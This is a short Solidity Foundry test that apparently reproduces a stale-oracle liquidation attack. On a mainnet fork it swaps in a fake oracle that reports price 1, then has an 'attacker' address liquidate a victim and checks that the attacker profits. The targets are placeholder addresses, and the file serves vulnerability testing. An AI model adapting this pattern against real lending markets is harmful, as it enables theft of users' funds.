// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IOracle} from "src/interfaces/IOracle.sol";
import {IMarket} from "src/interfaces/IMarket.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

contract StaleOracle {
    function latestAnswer() external pure returns (int256) {
        return 1;
    }
}

contract StalePriceTest is Test {
    IOracle oracle = IOracle(0x00000000000000000000000000000000000000A1);
    IMarket market = IMarket(0x00000000000000000000000000000000000000B2);
    IERC20 token = IERC20(0x00000000000000000000000000000000000000C3);
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 19_000_000);
    }

    function test_liquidateAtStalePrice() public {
        vm.etch(address(oracle), address(new StaleOracle()).code);
        uint256 before = token.balanceOf(attacker);
        vm.prank(attacker);
        market.liquidate(address(0xBEEF));
        assertGt(token.balanceOf(attacker), before);
    }
}
